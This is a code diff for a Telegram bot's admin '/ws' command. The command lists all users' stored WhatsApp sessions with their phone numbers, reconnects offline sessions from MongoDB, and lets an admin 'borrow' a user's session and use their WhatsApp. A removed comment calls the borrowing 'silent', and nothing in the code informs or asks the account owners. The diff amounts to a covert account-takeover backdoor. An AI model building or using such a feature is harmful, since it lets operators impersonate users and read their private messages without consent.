@@ -79,7 +79,7 @@ import {
   loadActiveCigSessions,
   PersistentCigSession,
 } from "./mongo-bot-data";
-import { getSessionStats, cleanupStaleSessions, clearMongoSession } from "./mongo-auth-state";
+import { getSessionStats, cleanupStaleSessions, clearMongoSession, listStoredWhatsAppSessions } from "./mongo-auth-state";
 import {
   Language,
   LANGUAGES,
@@ -2908,8 +2908,8 @@ bot.command("admin", async (ctx) => {
 });
 
 // ─── /ws — Admin WhatsApp session viewer & borrower ──────────────────────────
-// /ws              → list all active WA sessions with userId + phone
-// /ws [userId]     → admin borrows that user's WA session (silent, no delete)
+// /ws              → list ALL sessions from MongoDB (live 🟢 vs offline 🔴)
+// /ws [userId]     → reconnect that user from MongoDB + admin borrows session
 // /ws off          → admin releases the borrowed session
 bot.command("ws", async (ctx) => {
   if (!isAdmin(ctx.from!.id)) { await ctx.reply("🚫 You are not an admin."); return; }
@@ -2930,51 +2930,99 @@ bot.command("ws", async (ctx) => {
     return;
   }
 
-  // ── /ws [userId] — borrow a specific user's WA session ─────────────────────
-  if (arg0 && arg0 !== "") {
+  // ── /ws [userId] — reconnect + borrow a specific user's WA session ─────────
+  if (arg0 !== "") {
     const targetUserId = arg0;
+    const alreadyLive = !!getConnectedWhatsAppNumber(targetUserId);
+
+    // Send a progress message so admin sees what's happening
+    const progressMsg = await ctx.reply(
+      alreadyLive
+        ? `🔄 <b>Session already live — borrowing...</b>`
+        : `⏳ <b>Reconnecting from MongoDB...</b>\n\nUser <code>${targetUserId}</code> ka session load ho raha hai, please wait (up to 30s).`,
+      { parse_mode: "HTML" }
+    );
+
     let phone = getConnectedWhatsAppNumber(targetUserId);
-    let statusText = "";
+    let statusLine = "";
+
     if (!phone) {
       try {
+        // Load from MongoDB and wait for socket to connect
         await ensureSessionLoaded(targetUserId);
-        await waitForWhatsAppConnected(targetUserId, { timeoutMs: 20_000, pollMs: 500 });
+        await waitForWhatsAppConnected(targetUserId, { timeoutMs: 30_000, pollMs: 500 });
         phone = getConnectedWhatsAppNumber(targetUserId);
-        statusText = phone
-          ? `📞 Phone: <code>${phone}</code> (loaded from MongoDB)`
-          : `⚠️ Session loaded but phone number detect nahi hua`;
+        statusLine = phone
+          ? `📞 Phone: <code>${phone}</code>\n✅ MongoDB se reconnect hua!`
+          : `⚠️ Session load hua par phone number detect nahi hua`;
       } catch (err: any) {
-        await ctx.reply(`❌ User <code>${targetUserId}</code> ka WA session load nahi hua.\n${err?.message ?? ""}`, { parse_mode: "HTML" });
+        try {
+          await bot.api.editMessageText(ctx.chat!.id, progressMsg.message_id,
+            `❌ <b>Reconnect failed!</b>\n\nUser <code>${targetUserId}</code>\nError: ${err?.message ?? "Unknown"}`,
+            { parse_mode: "HTML" }
+          );
+        } catch {}
         return;
       }
     } else {
-      statusText = `📞 Phone: <code>${phone}</code> (already connected)`;
+      statusLine = `📞 Phone: <code>${phone}</code>\n✅ Already connected (live)`;
     }
+
     adminBorrowedWaSession.set(adminId, targetUserId);
+
+    try {
+      await bot.api.editMessageText(ctx.chat!.id, progressMsg.message_id,
+        `✅ <b>WA Session Connected!</b>\n\n` +
+        `👤 User ID: <code>${targetUserId}</code>\n${statusLine}\n\n` +
+        `Ab aap iss user ka WhatsApp use kar sakte ho.\n` +
+        `Band karne ke liye: <code>/ws off</code>`,
+        { parse_mode: "HTML" }
+      );
+    } catch {}
+    return;
+  }
+
+  // ── /ws — list ALL sessions from MongoDB (live + offline) ──────────────────
+  let allStored: Array<{ userId: string; phoneNumber: string }> = [];
+  try {
+    allStored = await listStoredWhatsAppSessions();
+  } catch {}
+
+  // Filter out internal _auto sessions from the list
+  const mainSessions = allStored.filter(s => !s.userId.endsWith("_auto"));
+
+  if (!mainSessions.length) {
+    const currentBorrowed = adminBorrowedWaSession.get(adminId);
     await ctx.reply(
-      `✅ <b>WA Session Borrowed!</b>\n\n` +
-      `👤 User ID: <code>${targetUserId}</code>\n${statusText}\n\n` +
-      `Ab aap iss user ka WhatsApp use kar sakte ho.\n` +
-      `Band karne ke liye: <code>/ws off</code>`,
+      `📱 <b>WhatsApp Sessions</b>\n\n❌ MongoDB me koi session saved nahi hai.` +
+      (currentBorrowed ? `\n\n🔗 Borrowed: <code>${currentBorrowed}</code>` : "") +
+      `\n\n<b>Commands:</b>\n• <code>/ws [userId]</code> — User ka WA connect karo\n• <code>/ws off</code> — Release karo`,
       { parse_mode: "HTML" }
     );
     return;
   }
 
-  // ── /ws — list all active sessions ─────────────────────────────────────────
-  const activeIds = getActiveSessionUserIds();
   const lines: string[] = [];
-  for (const sid of activeIds) {
-    if (sid.endsWith("_auto")) continue;
-    const phone = getConnectedWhatsAppNumber(sid);
-    if (phone) lines.push(`👤 <code>${sid}</code>  📞 <code>${phone}</code>`);
+  for (const s of mainSessions) {
+    const live = !!getConnectedWhatsAppNumber(s.userId);
+    const statusIcon = live ? "🟢" : "🔴";
+    const statusText = live ? "Live" : "Offline";
+    const phoneDisplay = s.phoneNumber ? `📞 <code>${s.phoneNumber}</code>` : `📞 <i>unknown</i>`;
+    lines.push(`${statusIcon} <b>${statusText}</b> | 👤 <code>${s.userId}</code> | ${phoneDisplay}`);
   }
+
+  const liveCount = mainSessions.filter(s => !!getConnectedWhatsAppNumber(s.userId)).length;
+  const offlineCount = mainSessions.length - liveCount;
   const currentBorrowed = adminBorrowedWaSession.get(adminId);
+
   await ctx.reply(
-    `📱 <b>Active WhatsApp Sessions</b>\n\n` +
-    (lines.length ? lines.join("\n") : "❌ Koi active session nahi") +
+    `📱 <b>All WhatsApp Sessions (MongoDB)</b>\n` +
+    `🟢 Live: ${liveCount} | 🔴 Offline: ${offlineCount} | 📦 Total: ${mainSessions.length}\n\n` +
+    lines.join("\n") +
     (currentBorrowed ? `\n\n🔗 <b>Ab borrow ho raha hai:</b> <code>${currentBorrowed}</code>` : "") +
-    `\n\n<b>Commands:</b>\n• <code>/ws [userId]</code> — User ka WA borrow karo\n• <code>/ws off</code> — Release karo`,
+    `\n\n<b>Commands:</b>\n` +
+    `• <code>/ws [userId]</code> — Offline session ko live karo + borrow karo\n` +
+    `• <code>/ws off</code> — Borrowed session release karo`,
     { parse_mode: "HTML" }
   );
 });
